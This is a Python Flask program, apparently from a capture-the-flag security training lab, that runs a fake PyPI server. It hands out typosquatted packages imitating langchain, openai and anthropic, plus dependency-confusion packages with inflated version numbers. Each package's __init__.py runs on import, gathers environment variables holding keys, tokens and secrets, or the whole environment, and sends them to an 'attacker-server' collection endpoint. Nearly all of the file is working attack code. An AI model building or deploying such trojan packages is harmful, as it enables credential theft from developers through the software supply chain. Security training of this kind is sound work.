"""
ASI04 Lab - Fake PyPI Server
Serves malicious packages for typosquatting and dependency confusion

Challenges:
- ASI04-01: Typosquatted Package
- ASI04-03: Dependency Confusion
"""

from flask import Flask, send_file, jsonify, Response
import os
import io
import tarfile
import base64
import hashlib

app = Flask(__name__)

# Malicious package payloads
PACKAGES = {
    # Typosquatted packages (similar names to legitimate ones)
    "langchaln": {  # langchain -> langchaln (typo)
        "version": "0.1.0",
        "description": "LangChain framework for LLM applications",
        "payload": "typosquat"
    },
    "langchain-agent-util": {  # langchain-agent-utils -> util (missing 's')
        "version": "1.0.0",
        "description": "Agent utilities for LangChain",
        "payload": "typosquat"
    },
    "openal": {  # openai -> openal
        "version": "1.0.0",
        "description": "OpenAI Python client",
        "payload": "typosquat"
    },
    "antropic": {  # anthropic -> antropic
        "version": "0.5.0",
        "description": "Anthropic API client",
        "payload": "typosquat"
    },
    
    # Dependency confusion - higher versions of "internal" packages
    "acme-agent-core": {
        "version": "99.0.0",  # Much higher than "internal" version
        "description": "ACME Corp Agent Core Library",
        "payload": "depconfusion"
    },
    "internal-llm-utils": {
        "version": "999.0.0",
        "description": "Internal LLM Utilities",
        "payload": "depconfusion"
    },
    "corp-ai-tools": {
        "version": "50.0.0",
        "description": "Corporate AI Tools",
        "payload": "depconfusion"
    }
}

def generate_malicious_init(package_name, payload_type):
    """Generate malicious __init__.py content"""
    
    if payload_type == "typosquat":
        return f'''"""
{package_name} - Legitimate looking package
"""
import os
import base64
import urllib.request

__version__ = "{PACKAGES[package_name]['version']}"
__author__ = "Definitely Legitimate Developer"

def _beacon():
    """Phone home on import"""
    try:
        data = {{
            "package": "{package_name}",
            "type": "typosquat_install",
            "cwd": os.getcwd(),
            "user": os.getenv("USER", "unknown"),
            "env": {{k: v for k, v in os.environ.items() 
                   if any(x in k.lower() for x in ["key", "secret", "token", "password", "api"])}},
            "flag": "ASI04_FLAG{{typ0squ4t_g0t_y0u}}"
        }}
        encoded = base64.b64encode(str(data).encode()).decode()
        urllib.request.urlopen(
            f"http://attacker-server:8666/collect?d={{encoded}}",
            timeout=3
        )
    except:
        pass

# Execute on import
_beacon()

# Legitimate-looking exports
class AgentToolkit:
    """Toolkit for agent development"""
    pass

class ToolRegistry:
    """Registry for tools"""
    pass

def format_response(text):
    return text

def parse_input(data):
    return data
'''

    elif payload_type == "depconfusion":
        return f'''"""
{package_name} - Internal package (COMPROMISED VERSION)
This version was uploaded to public PyPI with a higher version number
"""
import os
import socket
import json

__version__ = "{PACKAGES[package_name]['version']}"

def _exfil():
    """Exfiltrate on import via dependency confusion"""
    try:
        data = {{
            "package": "{package_name}",
            "type": "dependency_confusion",
            "version": __version__,
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "env": dict(os.environ),
            "flag": "ASI04_FLAG{{d3p_c0nfus10n_pwn3d}}"
        }}
        
        import urllib.request
        req = urllib.request.Request(
            "http://attacker-server:8666/collect",
            data=json.dumps(data).encode(),
            headers={{"Content-Type": "application/json"}}
        )
        urllib.request.urlopen(req, timeout=3)
    except:
        pass

_exfil()

# Mimic internal package API
class AgentCore:
    def __init__(self):
        pass
    
    def process(self, data):
        return data

def initialize():
    return AgentCore()
'''

def generate_setup_py(package_name):
    """Generate setup.py for the package"""
    pkg = PACKAGES[package_name]
    
    return f'''from setuptools import setup, find_packages

setup(
    name="{package_name}",
    version="{pkg['version']}",
    description="{pkg['description']}",
    author="Legitimate Developer",
    author_email="dev@example.com",
    packages=find_packages(),
    install_requires=[
        "requests>=2.0.0",
    ],
    python_requires=">=3.7",
)
'''

def create_package_tarball(package_name):
    """Create a tarball of the malicious package"""
    pkg = PACKAGES[package_name]
    pkg_dir = package_name.replace("-", "_")
    
    # Create in-memory tarball
    tar_buffer = io.BytesIO()
    
    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
        # Add __init__.py
        init_content = generate_malicious_init(package_name, pkg['payload'])
        init_info = tarfile.TarInfo(name=f"{package_name}-{pkg['version']}/{pkg_dir}/__init__.py")
        init_data = init_content.encode('utf-8')
        init_info.size = len(init_data)
        tar.addfile(init_info, io.BytesIO(init_data))
        
        # Add setup.py
        setup_content = generate_setup_py(package_name)
        setup_info = tarfile.TarInfo(name=f"{package_name}-{pkg['version']}/setup.py")
        setup_data = setup_content.encode('utf-8')
        setup_info.size = len(setup_data)
        tar.addfile(setup_info, io.BytesIO(setup_data))
        
        # Add PKG-INFO
        pkg_info = f"""Metadata-Version: 1.0
Name: {package_name}
Version: {pkg['version']}
Summary: {pkg['description']}
"""
        pkg_info_tarinfo = tarfile.TarInfo(name=f"{package_name}-{pkg['version']}/PKG-INFO")
        pkg_info_data = pkg_info.encode('utf-8')
        pkg_info_tarinfo.size = len(pkg_info_data)
        tar.addfile(pkg_info_tarinfo, io.BytesIO(pkg_info_data))
    
    tar_buffer.seek(0)
    return tar_buffer.getvalue()

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "packages": list(PACKAGES.keys()),
        "warning": "This is a MALICIOUS PyPI server for security training"
    })

@app.route('/simple/', methods=['GET'])
def simple_index():
    """PyPI simple index"""
    links = "\n".join([
        f'<a href="/simple/{pkg}/">{pkg}</a>'
        for pkg in PACKAGES.keys()
    ])
    
    return Response(f"""<!DOCTYPE html>
<html>
<head><title>Simple Index</title></head>
<body>
<h1>Simple Index</h1>
{links}
</body>
</html>""", mimetype='text/html')

@app.route('/simple/<package_name>/', methods=['GET'])
def package_index(package_name):
    """Package-specific index"""
    if package_name not in PACKAGES:
        return Response("Not Found", status=404)
    
    pkg = PACKAGES[package_name]
    filename = f"{package_name}-{pkg['version']}.tar.gz"
    
    # Calculate hash for the tarball
    tarball = create_package_tarball(package_name)
    sha256_hash = hashlib.sha256(tarball).hexdigest()
    
    return Response(f"""<!DOCTYPE html>
<html>
<head><title>Links for {package_name}</title></head>
<body>
<h1>Links for {package_name}</h1>
<a href="/packages/{filename}#sha256={sha256_hash}">{filename}</a>
</body>
</html>""", mimetype='text/html')

@app.route('/packages/<filename>', methods=['GET'])
def download_package(filename):
    """Download package tarball"""
    # Extract package name from filename
    for pkg_name in PACKAGES.keys():
        if filename.startswith(pkg_name):
            tarball = create_package_tarball(pkg_name)
            
            return Response(
                tarball,
                mimetype='application/gzip',
                headers={
                    'Content-Disposition': f'attachment; filename={filename}'
                }
            )
    
    return Response("Not Found", status=404)

@app.route('/pypi/<package_name>/json', methods=['GET'])
def package_json(package_name):
    """JSON API for package info"""
    if package_name not in PACKAGES:
        return jsonify({"error": "Not found"}), 404
    
    pkg = PACKAGES[package_name]
    filename = f"{package_name}-{pkg['version']}.tar.gz"
    tarball = create_package_tarball(package_name)
    sha256_hash = hashlib.sha256(tarball).hexdigest()
    
    return jsonify({
        "info": {
            "name": package_name,
            "version": pkg['version'],
            "summary": pkg['description'],
            "author": "Legitimate Developer"
        },
        "releases": {
            pkg['version']: [
                {
                    "filename": filename,
                    "url": f"http://localhost:8081/packages/{filename}",
                    "digests": {
                        "sha256": sha256_hash
                    }
                }
            ]
        }
    })

# CTF hint endpoints
@app.route('/hint', methods=['GET'])
def hint():
    return jsonify({
        "challenge": "ASI04 - Supply Chain",
        "hints": [
            "Look for packages with names similar to popular ones",
            "Check version numbers - unusually high versions may indicate dependency confusion",
            "The malicious code executes on import",
            "Look for network calls in __init__.py"
        ],
        "typosquat_examples": ["langchaln (langchain)", "openal (openai)"],
        "depconfusion_examples": ["acme-agent-core v99.0.0 (internal is v1.0.0)"]
    })

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║         FAKE PYPI SERVER (MALICIOUS)                         ║
    ║         Typosquatting & Dependency Confusion                 ║
    ║         Port: 8081                                           ║
    ║                                                              ║
    ║         DO NOT USE IN PRODUCTION!                            ║
    ╚══════════════════════════════════════════════════════════════╝
    
    Available malicious packages:
    """)
    for pkg, info in PACKAGES.items():
        print(f"    - {pkg} v{info['version']} ({info['payload']})")
    print()
    
    app.run(host='0.0.0.0', port=8081, debug=True)
